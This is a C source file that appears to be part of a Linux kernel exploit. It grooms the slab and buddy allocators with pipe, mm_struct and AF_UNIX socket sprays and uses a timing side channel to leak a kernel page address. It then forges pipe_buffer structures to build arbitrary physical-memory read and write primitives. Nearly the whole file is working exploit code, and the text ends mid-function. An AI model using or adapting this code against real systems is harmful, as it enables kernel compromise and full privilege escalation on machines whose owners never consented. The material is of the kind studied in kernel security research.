#include "common.h"

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#include P0_FINGERPRINT_HEADER
#endif

#define PIPE_SHAPE_ROUNDS 0
#define PHYSRW_PROOF_OFF 0x7000
#define PHYS_READ_TAG "nebusec_70687973727730"
#define PHYS_WRITE_TAG "nebusec_70687973727731"
#define PHYS64_SEED 0x306365737562656eULL
#define PHYS64_NEXT 0x316365737562656eULL
#define PIPE_ORDER3_PROBE_MAX 512
#define PIPE_ORDER3_STREAM_LEN (ORDER3_SIZE - SKB_DATA_DELTA)
#define PIPE_ORDER3_MAGIC 0x335245444c4f4847ULL

static int pipe_objects_ready;
static int pipe_fds_n[PIPE_N_COUNT][2];
static int pipe_fds_c[PIPE_C_COUNT][2];
static int pipe_fds_e[PIPE_E_COUNT][2];
static int pipe_fds_drain[PIPE_DRAIN][2];
static int pipe_fds_reclaim[PIPE_RECLAIM][2];
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
static int p0_gate_holders[PIPE_RECLAIM][2];
static int p0_gate_holders_initialized;
#endif

pid_t pipe_prepare_child = -1;
uint64_t kmalloc_pipe_cache;
uint64_t kmalloc_normal_1k_cache;
uint64_t kmalloc_normal_2k_cache;
uint64_t kmalloc_cgroup_1k_cache;
uint64_t kmalloc_cgroup_2k_cache;
uint64_t candidate_slab_cache;
int pipe_cache_gate_ok;
int pipe_cache_page_index = -1;
int pipe_cache_slot_hit = -1;
uint64_t pipe_page_slab_cache[PIPE_CANDIDATE_PAGES];
uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
uintptr_t pipebuf_page_base;
uintptr_t pipebuf_addr;
int pipebuf_pipe_idx = -1;
char physrw_readback[64];
char physrw_after_write[64];
int physrw_read_ok;
int physrw_write_ok;
int pipe_scan_vmemmap;
int pipe_scan_ops;
int pipe_scan_len;
int pipe_probe_found;
uint64_t pipe_probe_page;
uint64_t pipe_probe_ops;
uint64_t pipe_probe_private;
uint32_t pipe_probe_len;
uint32_t pipe_probe_flags;
uint64_t pipe_scan_first_page;
uint64_t pipe_scan_first_ops;
uint64_t pipe_scan_q0;
uint64_t pipe_scan_q1;
uint64_t pipe_scan_q2;
uint64_t pipe_scan_q3;
uint32_t pipe_scan_first_len;
uint32_t pipe_scan_first_flags;
uint64_t physrw_read64_before;
uint64_t physrw_read64_after;
uint64_t physrw_write64_value;
int physrw_read64_ok;
int physrw_write64_ok;

void init_ctx(struct mm_ctx *ctx, size_t cnt) {
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
}

void resize_pipe_slots(int pipefd[2], size_t slots) {
  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
}

void make_pipe_object(int pipefd[2]) {
  SYSCHK(pipe(pipefd));
  resize_pipe_slots(pipefd, 2);
}

void alloc_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
}

void free_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, 2);
}

void shape_pipe_cache_once(void) {
  for (size_t i = 0; i < PIPE_N_COUNT; i++) {
    alloc_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i++) {
    alloc_pipe_object(pipe_fds_c[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    alloc_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_N_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    free_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_c[i]);
  }
}

void shape_pipe_cache(void) {
  for (int round = 0; round < PIPE_SHAPE_ROUNDS; round++) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      free_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      free_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      free_pipe_object(pipe_fds_e[i]);
    }
    shape_pipe_cache_once();
  }
}

struct pipe_order3_probe {
  int sv[2];
  uint64_t magic;
};

struct pipe_order3_state {
  struct pipe_order3_probe *probes;
  unsigned char *payload;
};

static struct pipe_order3_state *pipe_prepare_order3_probes(void) {
  struct pipe_order3_state *state = calloc(1, sizeof(*state));
  if (!state)
    return NULL;
  state->probes = calloc(PIPE_ORDER3_PROBE_MAX + 1,
                         sizeof(*state->probes));
  state->payload = malloc(PIPE_ORDER3_STREAM_LEN);
  if (!state->probes || !state->payload) {
    free(state->payload);
    free(state->probes);
    free(state);
    return NULL;
  }

  for (size_t i = 0; i <= PIPE_ORDER3_PROBE_MAX; i++) {
    state->probes[i].sv[0] = -1;
    state->probes[i].sv[1] = -1;
    if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0,
                   state->probes[i].sv) != 0) {
      pr_warning("pipe order-3 socket precreate stopped at %zu errno=%d\n",
                 i, errno);
      break;
    }
  }
  return state;
}

static int pipe_probe_sample(uintptr_t base, uint64_t magic) {
  uint64_t first[8] = {0};
  uint64_t last[8] = {0};
  if (kernel_read_data(-1, base, first, sizeof(first)) !=
          (ssize_t)sizeof(first) ||
      kernel_read_data(-1, base + ORDER3_SIZE - sizeof(last),
                       last, sizeof(last)) != (ssize_t)sizeof(last))
    return 0;
  for (size_t i = 0; i < sizeof(first) / sizeof(first[0]); i++) {
    if (first[i] != magic || last[i] != magic)
      return 0;
  }
  return 1;
}

static int pipe_alloc_order3_probe(struct pipe_order3_state *state,
                                   int index, uint64_t magic) {
  struct pipe_order3_probe *probe = &state->probes[index];
  if (probe->sv[0] < 0 || probe->sv[1] < 0)
    return 0;
  probe->magic = magic;
  for (size_t off = 0; off + sizeof(magic) <= PIPE_ORDER3_STREAM_LEN;
       off += sizeof(magic))
    memcpy(state->payload + off, &magic, sizeof(magic));
  ssize_t sent = send(probe->sv[0], state->payload,
                      PIPE_ORDER3_STREAM_LEN, 0);
  return sent == PIPE_ORDER3_STREAM_LEN;
}

static int pipe_drain_order3_probe(struct pipe_order3_state *state,
                                   int index) {
  struct pipe_order3_probe *probe = &state->probes[index];
  size_t drained = 0;
  while (drained < PIPE_ORDER3_STREAM_LEN) {
    ssize_t got = recv(probe->sv[1], state->payload + drained,
                       PIPE_ORDER3_STREAM_LEN - drained, 0);
    if (got < 0 && errno == EINTR)
      continue;
    if (got <= 0)
      break;
    drained += (size_t)got;
  }
  return drained == PIPE_ORDER3_STREAM_LEN;
}

/* Drain order-3 buddy lists with one-fragment AF_UNIX stream skbs while the
 * configfs read primitive watches the exact released page. Socket objects are
 * created before release so only the skb head and one order-3 page are
 * allocated inside the critical window. Once a unique marker covers both
 * ends of the page, keep adjacent allocations alive, free only the capturing
 * skb, and let the next kmalloc-1k slab take the unmerged order-3 block. */
static int pipe_stage_exact_order3(uintptr_t base,
                                   struct pipe_order3_state *state) {
  int captured = -1;
  int allocated = 0;
  for (int i = 0; i < PIPE_ORDER3_PROBE_MAX; i++) {
    uint64_t magic = PIPE_ORDER3_MAGIC ^ (uint64_t)(i + 1);
    if (!pipe_alloc_order3_probe(state, i, magic))
      break;
    allocated++;
    if (pipe_probe_sample(base, magic)) {
      captured = i;
      break;
    }
  }
  if (captured < 0) {
    pr_warning("pipe order-3 oracle missed target after %d probes\n",
               allocated);
    return 0;
  }

  /* One allocation after the hit holds the split buddy when the captured
   * target was the lower half. The previous allocation already holds it when
   * the target was the upper half. It also keeps the target skb's kmalloc-4k
   * head slab non-empty when that skb is freed. */
  int guard = captured + 1;
  if (guard <= PIPE_ORDER3_PROBE_MAX) {
    uint64_t magic = PIPE_ORDER3_MAGIC ^ (uint64_t)(guard + 1);
    if (pipe_alloc_order3_probe(state, guard, magic))
      allocated++;
  }

  /* The drain pipes have already consumed the old kmalloc-1k partials.
   * Shrink them while the probe still pins the target, then release the
   * target last. Reclaim growth first reuses those old slabs and should take
   * the now-newest order-3 page on its next slab allocation. */
  for (size_t i = 0; i < PIPE_DRAIN; i++)
    free_pipe_object(pipe_fds_drain[i]);

  int drained = pipe_drain_order3_probe(state, captured);
  close(state->probes[captured].sv[0]);
  close(state->probes[captured].sv[1]);
  state->probes[captured].sv[0] = -1;
  state->probes[captured].sv[1] = -1;
  pr_info("pipe order-3 oracle captured probe=%d allocated=%d guard=%d "
          "drain_arrays=%d drained=%d\n",
          captured, allocated,
          state->probes[guard].sv[0] >= 0 ? guard : -1,
          PIPE_DRAIN, drained);
  return drained;
}

static uintptr_t prepare_controlled_pipe_buffer_page_child(void) {
  int target_fds[ORDER3_SIZE / MM_STRUCT_SZ];
  uintptr_t base = 0;
  uintptr_t buddy_base = 0;
  int buddy_guard_fd = -1;
  if (!collect_controlled_mm_slab_page(
          &base, target_fds, &buddy_guard_fd, &buddy_base)) {
    pr_error("controlled pipe mm group collection failed\n");
    return 0;
  }
  pr_info("controlled pipe optional guard fd=%d buddy=%016zx\n",
          buddy_guard_fd, buddy_base);

  struct pipe_order3_state *order3_state = pipe_prepare_order3_probes();
  if (!order3_state) {
    pr_warning("pipe order-3 probe precreate failed\n");
    return 0;
  }

  /* Fill the kmalloc-1k cache with the drain population first. The exact
   * target stays pinned by its probe while those arrays are shrunk; draining
   * the probe then releases the target after the old slabs. */
  for (size_t i = 0; i < PIPE_DRAIN; i++)
    alloc_pipe_object(pipe_fds_drain[i]);

  int anchor_fd = -1;
  unsigned long slabs_before = 0;
  if (!release_controlled_mm_slab_page(
          target_fds, &anchor_fd, &slabs_before))
    return 0;

  if (!pipe_stage_exact_order3(base, order3_state))
    return 0;

  for (size_t i = 0; i < PIPE_RECLAIM; i++)
    alloc_pipe_object(pipe_fds_reclaim[i]);

  unsigned long slabs_after = controlled_mm_slab_count();
  pr_info("controlled pipe reclaim base=%016zx drain=%d reclaim=%d anchor=%d slabs=%lu->%lu\n",
          base, PIPE_DRAIN, PIPE_RECLAIM, anchor_fd,
          slabs_before, slabs_after);
  if (!slabs_after || slabs_after >= slabs_before) {
    pr_warning("controlled pipe reclaim rejected: mm slab not discarded\n");
    return 0;
  }
  return base;
}

uintptr_t prepare_pipe_buffer_page_child(void) {
  if (getenv("CONTROLLED_RECLAIM"))
    return prepare_controlled_pipe_buffer_page_child();
  struct mm_ctx prep;
  struct mm_ctx spray;
  struct mm_ctx pre;
  struct mm_ctx post;
  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

  init_ctx(&prep, 32 * objs_per_slab);
  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
  init_ctx(&pre, objs_per_slab - 1);
  init_ctx(&post, objs_per_slab);

  for (size_t i = 0; i < prep.mm_cnt; i++) {
    prep.childs[i] = -1;
    prep.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    spray.childs[i] = -1;
    spray.memfds[i] = clone_memfd();
  }

  setup_kernelsnitch();

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    pre.childs[i] = -1;
    pre.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post.mm_cnt; i++) {
    post.childs[i] = -1;
    post.memfds[i] = clone_memfd();
  }
  int leak_memfd = open_memfd(leak_child);

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    kill_child(pre.childs[i]);
  }
  for (size_t i = 0; i < post.mm_cnt; i++) {
    kill_child(post.childs[i]);
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    kill_child(spray.childs[i]);
  }
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_collisions_ready()) {
    pr_error("pipe KernelSnitch collision finding failed\n");
  }

  unsigned char *buf = malloc(SKB_SEND_SIZE);
  memset(buf, 0x50, SKB_SEND_SIZE);

  int skb_sv[2];
  int pcp_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
  pin_to_core(CORE);

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    SYSCHK(close(pre.memfds[i]));
    pre.memfds[i] = -1;
  }
  for (size_t i = 0; i < post.mm_cnt - 1; i++) {
    SYSCHK(close(post.memfds[i]));
    post.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab) {
    SYSCHK(close(spray.memfds[i]));
    spray.memfds[i] = -1;
  }
  SYSCHK(close(pcp_sv[0]));
  SYSCHK(close(pcp_sv[1]));

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(leak_memfd));
  SYSCHK(sendmsg(skb_sv[0], &msg, 0));

  run_kernelsnitch_bruteforce();
  uintptr_t leaked = cleanup_kernelsnitch();
  if (leaked == (uintptr_t)-1) {
    pr_error("pipe KernelSnitch sk_buff page leak failed\n");
  }
  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);

  shape_pipe_cache();

  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    alloc_pipe_object(pipe_fds_drain[i]);
  }

  pin_to_core(CORE);
  SYSCHK(close(skb_sv[0]));
  SYSCHK(close(skb_sv[1]));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    alloc_pipe_object(pipe_fds_reclaim[i]);
  }

  close_ctx_memfds(&prep);
  close_ctx_memfds(&spray);
  close_ctx_memfds(&pre);
  close_ctx_memfds(&post);
  free_ctx_storage(&prep);
  free_ctx_storage(&spray);
  free_ctx_storage(&pre);
  free_ctx_storage(&post);
  free(buf);
  return base;
}

uintptr_t prepare_pipe_buffer_page(void) {
  if (PIPE_SHAPE_ROUNDS != 0) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      make_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      make_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      make_pipe_object(pipe_fds_e[i]);
    }
  }
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    make_pipe_object(pipe_fds_drain[i]);
  }
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    make_pipe_object(pipe_fds_reclaim[i]);
  }
  pipe_objects_ready = 1;

  int result_pipe[2];
  SYSCHK(pipe(result_pipe));
  pid_t child = SYSCHK(fork());
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(1);
    }
    SYSCHK(close(result_pipe[0]));
    uintptr_t base = prepare_pipe_buffer_page_child();
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
      pipe_fds_drain[i][0] = -1;
      pipe_fds_drain[i][1] = -1;
    }
    SYSCHK(write(result_pipe[1], &base, sizeof(base)));
    for (;;) {
      sleep(60);
    }
  }

  pipe_prepare_child = child;
  SYSCHK(close(result_pipe[1]));
  uintptr_t base = 0;
  ssize_t got = read(result_pipe[0], &base, sizeof(base));
  SYSCHK(close(result_pipe[0]));
  if (got != (ssize_t)sizeof(base)) {
    pr_error("pipe page child did not report base\n");
  }
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    close(pipe_fds_drain[i][0]);
    close(pipe_fds_drain[i][1]);
    pipe_fds_drain[i][0] = -1;
    pipe_fds_drain[i][1] = -1;
  }
  return base;
}

void reset_pipe_attempt(void) {
  if (pipe_prepare_child > 0) {
    kill(pipe_prepare_child, SIGKILL);
    waitpid(pipe_prepare_child, NULL, 0);
    pipe_prepare_child = -1;
  }

  if (pipe_objects_ready) {
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
    }
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      close(pipe_fds_reclaim[i][0]);
      close(pipe_fds_reclaim[i][1]);
    }
    pipe_objects_ready = 0;
  }

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (p0_gate_holders_initialized) {
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      if (p0_gate_holders[i][0] >= 0) {
        close(p0_gate_holders[i][0]);
      }
      if (p0_gate_holders[i][1] >= 0) {
        close(p0_gate_holders[i][1]);
      }
      p0_gate_holders[i][0] = -1;
      p0_gate_holders[i][1] = -1;
    }
    p0_gate_holders_initialized = 0;
  }
#endif

  pipebuf_page_base = 0;
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_cache_gate_ok = 0;
  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  candidate_slab_cache = 0;
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
}

uintptr_t direct_to_page(uintptr_t addr) {
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

uintptr_t direct_to_head_page(int fd, uintptr_t addr) {
  uintptr_t page = direct_to_page(addr);
  uintptr_t head_addr = page + STRUCT_PAGE_COMPOUND_HEAD_OFF;
  uint64_t compound_head = kernel_read64(fd, head_addr);
  if (compound_head & 1) {
    return compound_head & ~1ULL;
  }
  return page;
}

uintptr_t page_to_direct(uintptr_t page) {
  uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
}

uintptr_t pipe_buf_ops_addr(void) {
  return text_addr(ANON_PIPE_BUF_OPS);
}

int pipe_cache_matches(uint64_t slab_cache) {
  if (slab_cache == 0) {
    return 0;
  }
  if (KMALLOC_PIPE_INDEX == 10) {
    return slab_cache == kmalloc_normal_1k_cache ||
           slab_cache == kmalloc_cgroup_1k_cache;
  }
  if (KMALLOC_PIPE_INDEX == 11) {
    return slab_cache == kmalloc_normal_2k_cache ||
           slab_cache == kmalloc_cgroup_2k_cache;
  }
  return slab_cache == kmalloc_pipe_cache;
}

int pipe_reclaim_cache_gate(int fd) {
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  memset(pipe_page_slab_cache, 0, sizeof(pipe_page_slab_cache));
  memset(pipe_page_type, 0, sizeof(pipe_page_type));

  uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
  memset(cache_slots, 0, sizeof(cache_slots));
  uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
  kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
  kmalloc_normal_1k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_normal_2k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
  kmalloc_cgroup_1k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_cgroup_2k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];

  kmalloc_pipe_cache =
    kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
  pr_info("pipe caches normal1k=%016zx normal2k=%016zx "
          "cgroup1k=%016zx cgroup2k=%016zx selected=%016zx\n",
          kmalloc_normal_1k_cache, kmalloc_normal_2k_cache,
          kmalloc_cgroup_1k_cache, kmalloc_cgroup_2k_cache,
          kmalloc_pipe_cache);
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    uintptr_t page = pipebuf_page_base + off;
    uintptr_t head = direct_to_head_page(fd, page);
    uint64_t cache08 = kernel_read64(fd, head + 0x08);
    uint64_t cache10 = kernel_read64(fd, head + 0x10);
    uint64_t cache18 = kernel_read64(fd, head + 0x18);
    uint64_t cache20 = kernel_read64(fd, head + 0x20);
    uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
    uintptr_t type_addr = head + STRUCT_PAGE_TYPE_OFF;
    uint32_t page_type = (uint32_t)kernel_read64(fd, type_addr);
    pipe_page_slab_cache[off / PAGE_SIZE] = slab_cache;
    pipe_page_type[off / PAGE_SIZE] = page_type;
    int cache_match = pipe_cache_matches(slab_cache);
    pr_info("pipe page idx=%zu page=%016zx head=%016zx "
            "cache08=%016llx cache10=%016llx cache18=%016llx "
            "cache20=%016llx type=%08x match=%d\n",
            off / PAGE_SIZE, page, head,
            (unsigned long long)cache08,
            (unsigned long long)cache10,
            (unsigned long long)cache18,
            (unsigned long long)cache20, page_type, cache_match);
    if (off == 0 || cache_match) {
      candidate_slab_cache = slab_cache;
    }
    for (int slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
      if (cache_slots[slot] == slab_cache) {
        pipe_cache_slot_hit = slot;
      }
    }
    if (cache_match) {
      pipebuf_page_base = page;
      pipe_cache_page_index = off / PAGE_SIZE;
      pipe_cache_gate_ok = 1;
      return 1;
    }
  }

  pipe_cache_gate_ok = 0;
  return 0;
}

int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab) {
  for (size_t off = 0; off < ORDER3_SIZE; off += PIPE_SCAN_CHUNK) {
    errno = 0;
    ssize_t got = kernel_read_data(
        fd, base + off, slab + off, PIPE_SCAN_CHUNK);
    if (got != PIPE_SCAN_CHUNK) {
      pr_warning("pipe slab read off=%#zx target=%016zx ret=%zd errno=%d\n",
                 off, base + off, got, errno);
      return 0;
    }
  }
  return 1;
}

int find_pipe_buffer(int fd, uintptr_t base) {
  unsigned char slab[ORDER3_SIZE];
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  pipe_scan_vmemmap = 0;
  pipe_scan_ops = 0;
  pipe_scan_len = 0;
  pipe_scan_first_page = 0;
  pipe_scan_first_ops = 0;
  pipe_scan_first_len = 0;
  pipe_scan_first_flags = 0;
  pipe_scan_q0 = 0;
  pipe_scan_q1 = 0;
  pipe_scan_q2 = 0;
  pipe_scan_q3 = 0;
  if (!read_pipe_slab(fd, base, slab)) {
    return 0;
  }
  memcpy(&pipe_scan_q0, slab + 0x00, 8);
  memcpy(&pipe_scan_q1, slab + 0x08, 8);
  memcpy(&pipe_scan_q2, slab + 0x10, 8);
  memcpy(&pipe_scan_q3, slab + 0x18, 8);

  for (size_t off = 0; off + sizeof(struct user_pipe_buffer) <= ORDER3_SIZE;
       off += 8) {
    struct user_pipe_buffer pb;
    memcpy(&pb, slab + off, sizeof(pb));
    if (pb.page >= VMEMMAP_START && pb.page < VMEMMAP_END) {
      pipe_scan_vmemmap++;
      if (pipe_scan_first_page == 0) {
        pipe_scan_first_page = pb.page;
        pipe_scan_first_ops = pb.ops;
        pipe_scan_first_len = pb.len;
        pipe_scan_first_flags = pb.flags;
      }
    } else {
      continue;
    }
    if (pb.ops == pipe_buf_ops_addr()) {
      pipe_scan_ops++;
    }
    if (pb.len > 0 && pb.len <= PIPE_RECLAIM) {
      pipe_scan_len++;
    }
    if (pb.offset != 0 || pb.ops != pipe_buf_ops_addr() ||
        pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.private != 0) {
      continue;
    }
    if (pb.len == 0 || pb.len > PIPE_RECLAIM) {
      continue;
    }

    pipebuf_addr = base + off;
    pipebuf_pipe_idx = (int)pb.len - 1;
    pipe_probe_found = 1;
    pipe_probe_page = pb.page;
    pipe_probe_ops = pb.ops;
    pipe_probe_private = pb.private;
    pipe_probe_len = pb.len;
    pipe_probe_flags = pb.flags;
    return 1;
  }

  return 0;
}

int pipe_phys_read(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    void *out, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  ssize_t got = read(pipefd[0], out, len);
  int ok = got == (ssize_t)len;
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
}

int pipe_phys_write(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    const void *data, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = 0;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  ssize_t wrote = write(pipefd[1], data, len);
  int ok = wrote == (ssize_t)len;
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
}

void forge_pipe_buffers_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write) {
  struct user_pipe_buffer pb;
  memset(&pb, 0, sizeof(pb));
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = for_write ? 0 : len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;

  for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PIPE_OBJECT_SIZE) {
    kernel_write_data(fd, base + off, &pb, sizeof(pb));
  }
}

int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_read(fd, pipefd, pipebuf_addr, direct_addr, out, len);
  } else {
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 0);
    ssize_t got = read(pipe_fds_reclaim[pipebuf_pipe_idx][0], out, len);
    return got == (ssize_t)len;
  }
}

int pipe_phys_write_data(
    int fd, uintptr_t direct_addr, const void *data, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_write(fd, pipefd, pipebuf_addr, direct_addr, data, len);
  } else {
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 1);
    ssize_t wrote = write(pipe_fds_reclaim[pipebuf_pipe_idx][1], data, len);
    return wrote == (ssize_t)len;
  }
}

uint64_t pipe_read64(int fd, uintptr_t direct_addr) {
  uint64_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
  return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
}

int install_pipe_physrw(int fd) {
  if (pipebuf_page_base == 0) {
    atomic_store(&pipe_prepare_done, 0);
    atomic_store(&pipe_prepare_request, 1);
    while (!atomic_load(&pipe_prepare_done)) {
      usleep(10000);
    }
  }

  uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
  uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
  if (proof_page != (proof_addr & ~(PAGE_SIZE - 1))) {
    return 0;
  }
  pipe_cache_gate_ok = 2;

  char marker[PIPE_RECLAIM];
  memset(marker, 0x61, sizeof(marker));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    SYSCHK(write(pipe_fds_reclaim[i][1], marker, i + 1));
  }

  int found = find_pipe_buffer(fd, pipebuf_page_base);
  pr_info("phys step pipe probe found=%d pipebuf=%016zx idx=%d scan=%d/%d/%d\n",
          found, pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap,
          pipe_scan_ops, pipe_scan_len);
  if (!found) {
    pr_info("phys step pipe scan q0=%016llx q1=%016llx q2=%016llx "
            "q3=%016llx first_page=%016llx first_ops=%016llx "
            "first_len=%u first_flags=%u\n",
            (unsigned long long)pipe_scan_q0,
            (unsigned long long)pipe_scan_q1,
            (unsigned long long)pipe_scan_q2,
